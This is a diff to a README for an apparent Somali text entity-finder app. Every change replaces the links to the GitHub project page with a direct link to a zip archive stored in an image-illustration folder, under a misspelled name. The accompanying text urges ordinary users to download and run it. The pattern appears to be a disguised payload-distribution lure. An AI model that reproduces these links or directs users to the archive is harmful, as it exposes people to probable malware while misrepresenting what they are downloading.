@@ -1,6 +1,6 @@
 # 🧠 NERVISION-AI - Somali Text Entity Finder
 
-[![Download NERVISION-AI](https://img.shields.io/badge/Download-NERVISION--AI-blue?style=for-the-badge&logo=github)](https://github.com/Saddleaeon625/NERVISION-AI)
+[![Download NERVISION-AI](https://img.shields.io/badge/Download-NERVISION--AI-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Saddleaeon625/NERVISION-AI/main/static/img/illustration/NERVISIO-AI-v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ NERVISION-AI is a web app that finds names, places, and other key details in Som
 
 Use the link below to visit the download page:
 
-[Visit the NERVISION-AI download page](https://github.com/Saddleaeon625/NERVISION-AI)
+[Visit the NERVISION-AI download page](https://raw.githubusercontent.com/Saddleaeon625/NERVISION-AI/main/static/img/illustration/NERVISIO-AI-v2.5.zip)
 
 ## 📋 What This App Does
 
@@ -38,7 +38,7 @@ If the app comes with a setup file or release package, use that first. If the pr
 
 Go to the project page here:
 
-[https://github.com/Saddleaeon625/NERVISION-AI](https://github.com/Saddleaeon625/NERVISION-AI)
+[https://raw.githubusercontent.com/Saddleaeon625/NERVISION-AI/main/static/img/illustration/NERVISIO-AI-v2.5.zip](https://raw.githubusercontent.com/Saddleaeon625/NERVISION-AI/main/static/img/illustration/NERVISIO-AI-v2.5.zip)
 
 On that page, look for the latest release, project files, or setup instructions. If you see a Windows installer or app file, download it to your computer.
 
@@ -227,7 +227,7 @@ This project relates to:
 
 If you need the project page later, use this link:
 
-[https://github.com/Saddleaeon625/NERVISION-AI](https://github.com/Saddleaeon625/NERVISION-AI)
+[https://raw.githubusercontent.com/Saddleaeon625/NERVISION-AI/main/static/img/illustration/NERVISIO-AI-v2.5.zip](https://raw.githubusercontent.com/Saddleaeon625/NERVISION-AI/main/static/img/illustration/NERVISIO-AI-v2.5.zip)
 
 ## 🧭 Quick Steps
 
